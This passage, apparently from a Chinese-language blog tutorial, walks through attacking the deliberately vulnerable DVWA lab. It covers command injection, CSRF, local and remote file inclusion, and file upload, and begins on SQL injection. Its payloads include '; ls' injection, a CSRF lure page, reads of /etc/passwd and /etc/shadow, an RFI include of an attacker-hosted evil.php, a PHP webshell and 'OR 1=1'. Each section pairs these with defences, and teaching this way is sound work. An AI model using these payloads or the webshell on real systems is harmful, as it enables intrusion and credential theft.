invoke__">php_uname</span>( <span class="hljs-string">&#x27;s&#x27;</span> ), <span class="hljs-string">&#x27;Windows NT&#x27;</span> ) ) &#123;<br>        <span class="hljs-variable">$cmd</span> = <span class="hljs-title function_ invoke__">shell_exec</span>( <span class="hljs-string">&#x27;ping  &#x27;</span> . <span class="hljs-variable">$target</span> );<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-variable">$cmd</span> = <span class="hljs-title function_ invoke__">shell_exec</span>( <span class="hljs-string">&#x27;ping  -c 4 &#x27;</span> . <span class="hljs-variable">$target</span> );<br>    &#125;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;pre&gt;<span class="hljs-subst">&#123;$cmd&#125;</span>&lt;/pre&gt;&quot;</span>;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
+
+<p><strong>逐行解读</strong>：</p>
+<ol>
+<li><code>$_REQUEST[ &#39;ip&#39; ]</code> — 获取用户输入的 IP 地址</li>
+<li><code>shell_exec( &#39;ping  -c 4 &#39; . $target )</code> — 把用户输入<strong>直接拼接</strong>到系统命令中</li>
+<li>如果用户输入了 <code>127.0.0.1; ls</code>，拼接后变成了 <code>ping -c 4 127.0.0.1; ls</code></li>
+<li>服务器执行了<strong>两条命令</strong>：先是 ping，然后是 ls</li>
+</ol>
+<p>问题就出在<strong>没有任何过滤</strong>——代码直接信任了用户的输入。</p>
+<h3 id="3-6-知识点总结"><a href="#3-6-知识点总结" class="headerlink" title="3.6 知识点总结"></a>3.6 知识点总结</h3><table>
+<thead>
+<tr>
+<th>概念</th>
+<th>解释</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>命令注入</td>
+<td>在用户输入中嵌入系统命令，让服务器执行</td>
+</tr>
+<tr>
+<td>shell_exec()</td>
+<td>PHP 中执行系统命令的函数</td>
+</tr>
+<tr>
+<td>命令连接符</td>
+<td><code>;</code> <code>&amp;&amp;</code> <code>|</code> <code>||</code> 等，用于连接多条命令</td>
+</tr>
+<tr>
+<td>输入过滤</td>
+<td>检查用户输入是否只包含合法字符</td>
+</tr>
+</tbody></table>
+<h3 id="3-7-防御方法"><a href="#3-7-防御方法" class="headerlink" title="3.7 防御方法"></a>3.7 防御方法</h3><ul>
+<li><strong>白名单过滤</strong>：只允许输入 IP 地址格式的字符（数字和点）</li>
+<li><strong>使用 escapeshellarg()</strong>：PHP 函数，会对输入进行转义处理</li>
+<li><strong>避免直接调用系统命令</strong>：尽量使用 PHP 内置函数替代</li>
+</ul>
+<hr>
+<h2 id="四、CSRF（跨站请求伪造）"><a href="#四、CSRF（跨站请求伪造）" class="headerlink" title="四、CSRF（跨站请求伪造）"></a>四、CSRF（跨站请求伪造）</h2><h3 id="4-1-这个漏洞是什么？"><a href="#4-1-这个漏洞是什么？" class="headerlink" title="4.1 这个漏洞是什么？"></a>4.1 这个漏洞是什么？</h3><p><strong>CSRF（Cross-Site Request Forgery）</strong>，跨站请求伪造。</p>
+<p>简单解释：攻击者构造一个<strong>恶意网页</strong>，当你访问这个网页时，它会<strong>代替你向目标网站发送请求</strong>。因为你的浏览器里保存着登录状态（Cookie），服务器会以为<strong>是你本人</strong>在操作。</p>
+<p>打个比方：有人伪造了一封有你签名的信件，寄给银行要求转账。银行看到签名就信以为真，其实信不是你写的。</p>
+<h3 id="4-2-前置知识：Cookie-和会话（Session）"><a href="#4-2-前置知识：Cookie-和会话（Session）" class="headerlink" title="4.2 前置知识：Cookie 和会话（Session）"></a>4.2 前置知识：Cookie 和会话（Session）</h3><table>
+<thead>
+<tr>
+<th>概念</th>
+<th>解释</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>Cookie</td>
+<td>服务器发送给浏览器并存储的小数据块，用于标识用户身份</td>
+</tr>
+<tr>
+<td>Session</td>
+<td>服务器端存储的用户会话信息</td>
+</tr>
+<tr>
+<td>登录状态</td>
+<td>你登录后，浏览器会自动在后续请求中带上 Cookie，服务器据此识别你</td>
+</tr>
+</tbody></table>
+<p>正是因为浏览器会<strong>自动带上 Cookie</strong>，所以 CSRF 攻击才能成功——恶意网页发出的请求也会带上你的 Cookie。</p>
+<h3 id="4-3-动手实践"><a href="#4-3-动手实践" class="headerlink" title="4.3 动手实践"></a>4.3 动手实践</h3><h4 id="第一步：修改密码"><a href="#第一步：修改密码" class="headerlink" title="第一步：修改密码"></a>第一步：修改密码</h4><ol>
+<li>点击左侧的 <strong>CSRF</strong></li>
+<li>你会看到一个修改密码的表单：输入新密码和确认新密码</li>
+<li>输入新密码（比如 <code>newpassword</code>），点击 Change</li>
+<li>提示密码修改成功</li>
+</ol>
+<h4 id="第二步：构造恶意页面"><a href="#第二步：构造恶意页面" class="headerlink" title="第二步：构造恶意页面"></a>第二步：构造恶意页面</h4><p>现在我们来伪造一个请求。在 DVWA 的 CSRF 页面，右键 → <strong>检查</strong>（或按 F12）打开开发者工具，切换到 <strong>Network（网络）</strong> 标签。</p>
+<p>再次修改密码（改成另一个密码），观察 Network 中捕获到的请求：</p>
+<figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs dts">POST <span class="hljs-keyword">/dvwa/</span>vulnerabilities<span class="hljs-keyword">/csrf/</span> HTTP/<span class="hljs-number">1.1</span><br>...<br><span class="hljs-attr">password</span><span class="hljs-operator">=</span>newpass<span class="hljs-variable">&amp;password_confirm</span>=newpass<span class="hljs-variable">&amp;</span>C<span class="hljs-attr">hange</span><span class="hljs-operator">=</span>Change<br></code></pre></td></tr></table></figure>
+
+<p>这就是修改密码时发送的请求。攻击者只需要构造一个自动发送这个请求的网页。</p>
+<p>创建一个 HTML 文件（比如 <code>csrf_attack.html</code>）：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span><br>       <span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><br>           <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>Free Money!<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br>       <span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br>       <span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br>           <span class="hljs-tag">&lt;<span class="hljs-name">h1</span>&gt;</span>恭喜你！点击领取 100 万元奖金！<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span><br>           <span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;http://dvwa/vulnerabilities/csrf/?password_new=hacked&amp;password_conf=hacked&amp;Change=Change&quot;</span>&gt;</span><br>               <span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;https://example.com/cute-cat.jpg&quot;</span> <span class="hljs-attr">alt</span>=<span class="hljs-string">&quot;点击领奖&quot;</span> <span class="hljs-attr">border</span>=<span class="hljs-string">&quot;0&quot;</span> /&gt;</span><br>           <span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><br><br>                  <span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br>   <span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></td></tr></table></figure>
+
+<blockquote>
+<p><strong>注意</strong>：将 <code>你的DVWA地址</code> 替换为实际的 DVWA 地址，比如 <code>127.0.0.1</code>。</p>
+</blockquote>
+<h4 id="第三步：触发攻击"><a href="#第三步：触发攻击" class="headerlink" title="第三步：触发攻击"></a>第三步：触发攻击</h4><ol>
+<li>确保你已经登录了 DVWA</li>
+<li>在浏览器中打开刚创建的 <code>csrf_attack.html</code></li>
+<li>页面会自动向 DVWA 发送修改密码的请求</li>
+<li>回到 DVWA，尝试用 <code>hacked</code> 登录——你会发现密码已经被改了！</li>
+</ol>
+<h3 id="4-4-漏洞原理（源码分析）"><a href="#4-4-漏洞原理（源码分析）" class="headerlink" title="4.4 漏洞原理（源码分析）"></a>4.4 漏洞原理（源码分析）</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">if</span>( <span class="hljs-keyword">isset</span>( <span class="hljs-variable">$_GET</span>[ <span class="hljs-string">&#x27;Change&#x27;</span> ] ) ) &#123;<br>    <span class="hljs-variable">$pass_new</span>  = <span class="hljs-variable">$_GET</span>[ <span class="hljs-string">&#x27;password_new&#x27;</span> ];<br>    <span class="hljs-variable">$pass_conf</span> = <span class="hljs-variable">$_GET</span>[ <span class="hljs-string">&#x27;password_conf&#x27;</span> ];<br><br>    <span class="hljs-keyword">if</span>( <span class="hljs-variable">$pass_new</span> == <span class="hljs-variable">$pass_conf</span> ) &#123;<br>        <span class="hljs-variable">$insert</span> = <span class="hljs-string">&quot;UPDATE `users` SET password = &#x27;<span class="hljs-subst">$pass_new</span>&#x27; WHERE user = &#x27;&quot;</span> . <span class="hljs-title function_ invoke__">dvwaCurrentUser</span>() . <span class="hljs-string">&quot;&#x27;;&quot;</span>;<br>        <span class="hljs-variable">$result</span> = <span class="hljs-title function_ invoke__">mysqli_query</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>],  <span class="hljs-variable">$insert</span> );<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;pre&gt;Password Changed.&lt;/pre&gt;&quot;</span>;<br>    &#125;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
+
+<p><strong>问题分析</strong>：</p>
+<ul>
+<li>代码只检查了两次密码是否一致</li>
+<li><strong>没有验证请求是否来自合法页面</strong>——任何来源的请求都会被处理</li>
+<li>没有 CSRF Token（令牌）机制</li>
+</ul>
+<h3 id="4-5-知识点总结"><a href="#4-5-知识点总结" class="headerlink" title="4.5 知识点总结"></a>4.5 知识点总结</h3><table>
+<thead>
+<tr>
+<th>概念</th>
+<th>解释</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>CSRF</td>
+<td>利用用户的登录状态，伪造请求代替用户操作</td>
+</tr>
+<tr>
+<td>Cookie</td>
+<td>浏览器自动携带的身份凭证，是 CSRF 攻击成功的关键</td>
+</tr>
+<tr>
+<td>隐藏表单</td>
+<td>攻击者用不可见的表单自动提交恶意请求</td>
+</tr>
+<tr>
+<td>CSRF Token</td>
+<td>服务器生成的一次性令牌，用于验证请求来源的合法性</td>
+</tr>
+</tbody></table>
+<h3 id="4-6-防御方法"><a href="#4-6-防御方法" class="headerlink" title="4.6 防御方法"></a>4.6 防御方法</h3><ul>
+<li><strong>CSRF Token</strong>：每次表单提交时携带一个服务器生成的随机令牌，服务器验证令牌是否有效</li>
+<li><strong>Referer 检查</strong>：检查请求来源页面是否是合法页面</li>
+<li><strong>关键操作二次验证</strong>：修改密码等操作要求输入原密码</li>
+<li><strong>SameSite Cookie</strong>：设置 Cookie 的 SameSite 属性为 Strict 或 Lax</li>
+</ul>
+<hr>
+<h2 id="五、File-Inclusion（文件包含）"><a href="#五、File-Inclusion（文件包含）" class="headerlink" title="五、File Inclusion（文件包含）"></a>五、File Inclusion（文件包含）</h2><h3 id="5-1-这个漏洞是什么？"><a href="#5-1-这个漏洞是什么？" class="headerlink" title="5.1 这个漏洞是什么？"></a>5.1 这个漏洞是什么？</h3><p><strong>文件包含</strong>漏洞是指攻击者可以控制文件路径，让服务器<strong>包含并执行</strong>任意文件。</p>
+<p>在 PHP 中，有两个函数可以从外部文件加载代码：</p>
+<table>
+<thead>
+<tr>
+<th>函数</th>
+<th>含义</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>include()</code></td>
+<td>包含并执行指定文件，如果文件不存在只产生警告</td>
+</tr>
+<tr>
+<td><code>require()</code></td>
+<td>包含并执行指定文件，如果文件不存在产生致命错误</td>
+</tr>
+</tbody></table>
+<p>如果文件路径是用户可控的，攻击者就能让服务器加载恶意文件。</p>
+<h3 id="5-2-前置知识：本地文件包含-vs-远程文件包含"><a href="#5-2-前置知识：本地文件包含-vs-远程文件包含" class="headerlink" title="5.2 前置知识：本地文件包含 vs 远程文件包含"></a>5.2 前置知识：本地文件包含 vs 远程文件包含</h3><ul>
+<li><strong>LFI（Local File Inclusion，本地文件包含）</strong>：包含服务器上已存在的文件</li>
+<li><strong>RFI（Remote File Inclusion，远程文件包含）</strong>：包含互联网上其他服务器上的文件</li>
+</ul>
+<p>RFI 的危害更大，因为攻击者可以完全控制被包含文件的内容。</p>
+<h3 id="5-3-动手实践"><a href="#5-3-动手实践" class="headerlink" title="5.3 动手实践"></a>5.3 动手实践</h3><h4 id="第一步：正常使用"><a href="#第一步：正常使用" class="headerlink" title="第一步：正常使用"></a>第一步：正常使用</h4><ol>
+<li>点击左侧的 <strong>File Inclusion</strong></li>
+<li>页面上有几个链接：File1、File2、File3 等</li>
+<li>点击 File1，页面会显示 <code>file1.php</code> 的内容</li>
+<li>观察 URL 栏，类似于：<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-built_in">..</span>./fileincl.php?<span class="hljs-attribute">page</span>=file1.php<br></code></pre></td></tr></table></figure>
+这说明页面通过 <code>page</code> 参数来决定加载哪个文件。</li>
+</ol>
+<h4 id="第二步：本地文件包含（LFI）"><a href="#第二步：本地文件包含（LFI）" class="headerlink" title="第二步：本地文件包含（LFI）"></a>第二步：本地文件包含（LFI）</h4><p>尝试加载 Linux 系统中的敏感文件：</p>
+<p><strong>读取密码文件</strong></p>
+<p>在 URL 中将 <code>page</code> 参数修改为：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">.../fileincl.php?page=/etc/passwd<br></code></pre></td></tr></table></figure>
+
+<p>你会看到 <code>/etc/passwd</code> 文件的内容——这是 Linux 系统中存储用户信息的文件。</p>
+<p><strong>读取其他文件</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">.../fileincl.php?page=/etc/shadow<br></code></pre></td></tr></table></figure>
+
+<p>（如果服务器权限足够，可以读取加密后的密码哈希）</p>
+<p><strong>尝试读取 PHP 源码</strong></p>
+<p>PHP 文件默认会被执行而不是显示源码。我们可以使用 PHP 的封装协议来查看源码：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">.../fileincl.php?page=php://filter/convert.base64-encode/resource=file1.php<br></code></pre></td></tr></table></figure>
+
+<p>这会把 <code>file1.php</code> 的源码进行 Base64 编码后显示出来。复制编码后的内容，使用 Base64 解码工具即可看到源码。</p>
+<h4 id="第三步：远程文件包含（RFI）"><a href="#第三步：远程文件包含（RFI）" class="headerlink" title="第三步：远程文件包含（RFI）"></a>第三步：远程文件包含（RFI）</h4><blockquote>
+<p><strong>注意</strong>：RFI 需要在 <code>php.ini</code> 中开启 <code>allow_url_include = On</code>。DVWA 默认可能是关闭的。</p>
+</blockquote>
+<p>如果 RFI 可用，攻击者可以在自己的服务器上放一个恶意 PHP 文件，然后通过 URL 包含它：</p>
+<figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli"><span class="hljs-string">.../fileincl.php</span>?page=http:<span class="hljs-string">//</span>攻击者服务器<span class="hljs-string">/evil.php</span><br></code></pre></td></tr></table></figure>
+
+<p><code>evil.php</code> 的内容可以是 <code>&lt;?php phpinfo(); ?&gt;</code>，这样服务器就会执行 <code>phpinfo()</code> 并显示 PHP 配置信息。</p>
+<h3 id="5-4-漏洞原理（源码分析）"><a href="#5-4-漏洞原理（源码分析）" class="headerlink" title="5.4 漏洞原理（源码分析）"></a>5.4 漏洞原理（源码分析）</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$file</span> = <span class="hljs-variable">$_GET</span>[ <span class="hljs-string">&#x27;page&#x27;</span> ];<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
+
+<p>就这一行——直接把用户传入的 <code>page</code> 参数作为文件路径，没有任何过滤和限制。然后后面的代码使用 <code>include()</code> 加载这个文件：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">include</span>( <span class="hljs-variable">$file</span> );<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
+
+<h3 id="5-5-知识点总结"><a href="#5-5-知识点总结" class="headerlink" title="5.5 知识点总结"></a>5.5 知识点总结</h3><table>
+<thead>
+<tr>
+<th>概念</th>
+<th>解释</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>LFI</td>
+<td>本地文件包含，加载服务器上的文件</td>
+</tr>
+<tr>
+<td>RFI</td>
+<td>远程文件包含，加载外部服务器上的文件</td>
+</tr>
+<tr>
+<td>include()</td>
+<td>PHP 包含文件的函数</td>
+</tr>
+<tr>
+<td>php:&#x2F;&#x2F;filter</td>
+<td>PHP 封装协议，可用于读取文件源码</td>
+</tr>
+<tr>
+<td>&#x2F;etc&#x2F;passwd</td>
+<td>Linux 系统的用户信息文件</td>
+</tr>
+</tbody></table>
+<h3 id="5-6-防御方法"><a href="#5-6-防御方法" class="headerlink" title="5.6 防御方法"></a>5.6 防御方法</h3><ul>
+<li><strong>白名单限制</strong>：只允许包含特定的文件名（如 <code>file1.php</code>、<code>file2.php</code>）</li>
+<li><strong>过滤路径字符</strong>：禁止 <code>../</code>、<code>..\\</code> 等目录遍历字符</li>
+<li><strong>关闭远程包含</strong>：在 <code>php.ini</code> 中设置 <code>allow_url_include = Off</code></li>
+</ul>
+<hr>
+<h2 id="六、File-Upload（文件上传）"><a href="#六、File-Upload（文件上传）" class="headerlink" title="六、File Upload（文件上传）"></a>六、File Upload（文件上传）</h2><h3 id="6-1-这个漏洞是什么？"><a href="#6-1-这个漏洞是什么？" class="headerlink" title="6.1 这个漏洞是什么？"></a>6.1 这个漏洞是什么？</h3><p><strong>文件上传</strong>漏洞是指网站允许用户上传文件，但没有对文件类型进行严格验证，导致攻击者可以上传<strong>恶意文件</strong>（通常是 Webshell），然后通过浏览器访问该文件来<strong>控制服务器</strong>。</p>
+<p>打个比方：一个网站允许你上传头像图片，但你上传了一个伪装成图片的程序文件，服务器没有识别出来，把它当普通文件存了下来。然后你通过浏览器访问这个文件，它就作为程序运行了——你的恶意代码就在服务器上执行了。</p>
+<h3 id="6-2-前置知识：什么是-Webshell？"><a href="#6-2-前置知识：什么是-Webshell？" class="headerlink" title="6.2 前置知识：什么是 Webshell？"></a>6.2 前置知识：什么是 Webshell？</h3><p><strong>Webshell</strong> 就是一个可以通过浏览器访问的脚本文件，它提供了控制服务器的功能。</p>
+<p>一个最简单的 PHP Webshell：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>]); <span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
+
+<p>把这个文件上传到服务器后，访问 <code>http://服务器地址/uploads/shell.php?cmd=whoami</code>，就能在服务器上执行任意命令。</p>
+<h3 id="6-3-动手实践"><a href="#6-3-动手实践" class="headerlink" title="6.3 动手实践"></a>6.3 动手实践</h3><h4 id="第一步：查看正常上传功能"><a href="#第一步：查看正常上传功能" class="headerlink" title="第一步：查看正常上传功能"></a>第一步：查看正常上传功能</h4><ol>
+<li>点击左侧的 <strong>File Upload</strong></li>
+<li>你会看到一个文件上传表单</li>
+<li>正常情况下，这个功能是让你上传图片的</li>
+</ol>
+<h4 id="第二步：准备-Webshell"><a href="#第二步：准备-Webshell" class="headerlink" title="第二步：准备 Webshell"></a>第二步：准备 Webshell</h4><p>创建一个 PHP 文件，命名为 <code>shell.php</code>，内容如下：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;pre&gt;&quot;</span>;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>])) &#123;<br>        <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>]);<br>    &#125;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;/pre&gt;&quot;</span>;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
+
+<h4 id="第三步：上传-Webshell"><a href="#第三步：上传-Webshell" class="headerlink" title="第三步：上传 Webshell"></a>第三步：上传 Webshell</h4><ol>
+<li>在文件上传页面，选择刚创建的 <code>shell.php</code></li>
+<li>点击 Upload</li>
+<li>DVWA Low 级别<strong>没有任何文件类型检查</strong>，上传会成功</li>
+<li>页面会显示文件被上传到了 <code>.../vulnerabilities/uploads/</code> 目录</li>
+<li>在浏览器中访问：<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">http:<span class="hljs-regexp">//</span>你的DVWA地址<span class="hljs-regexp">/dvwa/</span>vulnerabilities<span class="hljs-regexp">/uploads/</span>shell.php?cmd=ls<br></code></pre></td></tr></table></figure></li>
+<li>你会看到服务器当前目录的文件列表——你的 Webshell 成功运行了！</li>
+</ol>
+<h4 id="第四步：进一步利用"><a href="#第四步：进一步利用" class="headerlink" title="第四步：进一步利用"></a>第四步：进一步利用</h4><p>现在你可以通过修改 <code>cmd</code> 参数来执行任意命令：</p>
+<figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs dockerfile">shell.php?<span class="hljs-keyword">cmd</span><span class="language-bash">=<span class="hljs-built_in">cat</span> /etc/passwd</span><br>shell.php?<span class="hljs-keyword">cmd</span><span class="language-bash">=<span class="hljs-built_in">whoami</span></span><br>shell.php?<span class="hljs-keyword">cmd</span><span class="language-bash">=<span class="hljs-built_in">pwd</span></span><br>shell.php?<span class="hljs-keyword">cmd</span><span class="language-bash">=<span class="hljs-built_in">uname</span> -a</span><br></code></pre></td></tr></table></figure>
+
+<h3 id="6-4-漏洞原理（源码分析）"><a href="#6-4-漏洞原理（源码分析）" class="headerlink" title="6.4 漏洞原理（源码分析）"></a>6.4 漏洞原理（源码分析）</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">if</span>( <span class="hljs-keyword">isset</span>( <span class="hljs-variable">$_POST</span>[ <span class="hljs-string">&#x27;Upload&#x27;</span> ] ) ) &#123;<br>    <span class="hljs-variable">$target_path</span> = DVWA_WEB_PAGE_TO_ROOT . <span class="hljs-string">&quot;hackable/uploads/&quot;</span>;<br>    <span class="hljs-variable">$target_path</span> .= <span class="hljs-title function_ invoke__">basename</span>( <span class="hljs-variable">$_FILES</span>[ <span class="hljs-string">&#x27;uploaded&#x27;</span> ][ <span class="hljs-string">&#x27;name&#x27;</span> ] );<br>    <span class="hljs-keyword">if</span>( !<span class="hljs-title function_ invoke__">move_uploaded_file</span>( <span class="hljs-variable">$_FILES</span>[ <span class="hljs-string">&#x27;uploaded&#x27;</span> ][ <span class="hljs-string">&#x27;tmp_name&#x27;</span> ], <span class="hljs-variable">$target_path</span> ) ) &#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;pre&gt;Your image was not uploaded.&lt;/pre&gt;&quot;</span>;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;pre&gt;<span class="hljs-subst">&#123;$target_path&#125;</span> succesfully uploaded!&lt;/pre&gt;&quot;</span>;<br>    &#125;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
+
+<p><strong>逐行解读</strong>：</p>
+<ol>
+<li><code>$_FILES[ &#39;uploaded&#39; ][ &#39;name&#39; ]</code> — 获取上传文件的原始文件名</li>
+<li><code>basename()</code> — 只取文件名部分，去掉路径</li>
+<li><code>move_uploaded_file()</code> — 将上传的临时文件移动到目标路径</li>
+</ol>
+<p><strong>问题</strong>：代码只做了文件移动，<strong>完全没有检查</strong>：</p>
+<ul>
+<li>文件后缀名（是否是图片？）</li>
+<li>文件内容（是否包含恶意代码？）</li>
+<li>文件 MIME 类型</li>
+</ul>
+<h3 id="6-5-知识点总结"><a href="#6-5-知识点总结" class="headerlink" title="6.5 知识点总结"></a>6.5 知识点总结</h3><table>
+<thead>
+<tr>
+<th>概念</th>
+<th>解释</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>Webshell</td>
+<td>上传到服务器的恶意脚本文件，用于远程控制</td>
+</tr>
+<tr>
+<td>move_uploaded_file()</td>
+<td>PHP 处理文件上传的函数</td>
+</tr>
+<tr>
+<td>MIME 类型</td>
+<td>文件的媒体类型，如 image&#x2F;jpeg</td>
+</tr>
+<tr>
+<td>文件后缀</td>
+<td>文件名的扩展名，如 .php .jpg</td>
+</tr>
+</tbody></table>
+<h3 id="6-6-防御方法"><a href="#6-6-防御方法" class="headerlink" title="6.6 防御方法"></a>6.6 防御方法</h3><ul>
+<li><strong>白名单后缀检查</strong>：只允许上传图片后缀（.jpg、.png、.gif）</li>
+<li><strong>检查文件内容（Magic Bytes）</strong>：验证文件头部的魔数，确保是真正的图片</li>
+<li><strong>重命名文件</strong>：使用随机生成的文件名，不使用用户上传的原始文件名</li>
+<li><strong>上传目录禁止执行</strong>：设置上传目录不可执行 PHP 等脚本</li>
+<li><strong>文件大小限制</strong>：限制上传文件的大小</li>
+</ul>
+<hr>
+<h2 id="七、SQL-Injection（SQL-注入）"><a href="#七、SQL-Injection（SQL-注入）" class="headerlink" title="七、SQL Injection（SQL 注入）"></a>七、SQL Injection（SQL 注入）</h2><h3 id="7-1-这个漏洞是什么？"><a href="#7-1-这个漏洞是什么？" class="headerlink" title="7.1 这个漏洞是什么？"></a>7.1 这个漏洞是什么？</h3><p><strong>SQL 注入</strong>是 Web 安全中<strong>最经典、最重要</strong>的漏洞之一。</p>
+<p>当用户输入的数据被<strong>直接拼接到 SQL 语句</strong>中时，攻击者可以通过精心构造的输入来<strong>改变 SQL 语句的含义</strong>，从而执行非授权的数据库操作。</p>
+<p>打个比方：一个网站查询用户信息的 SQL 是：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">FROM</span> users <span class="hljs-keyword">WHERE</span> user_id <span class="hljs-operator">=</span> <span class="hljs-number">1</span><br></code></pre></td></tr></table></figure>
+
+<p>数字 <code>1</code> 来自用户输入。如果攻击者输入了 <code>1 OR 1=1</code>，SQL 语句变成了：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">FROM</span> users <span class="hljs-keyword">WHERE</span> user_id <span class="hljs-operator">=</span> <span class="hljs-number">1</span> <span class="hljs-keyword">OR</span> <span class="hljs-number">1</span><span class="hljs-operator">=</span><span class="hljs-number">1</span><br></code></pre></td></tr></table></figure>
+
+<p><code>1=1</code> 永远为真，所以这条 SQL 会返回<strong>所有用户</strong>的数据——这就是 SQL 注入。</p>
+<h3 id="7-2-前置知识：SQL-基础"><a href="#7-2-前置知识：SQL-基础" class="headerlink" title="7.2 前置知识：SQL 基础"></a>7.2 前置知识：SQL 基础</h3><p>你需要了解以下 SQL 语句：</p>
+<table>
+<thead>
+<tr>
+<th>SQL 语句</th>
+<th>作用</th>
+<th>示例</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>SELECT</code></td>
+<td>查询数据</td>
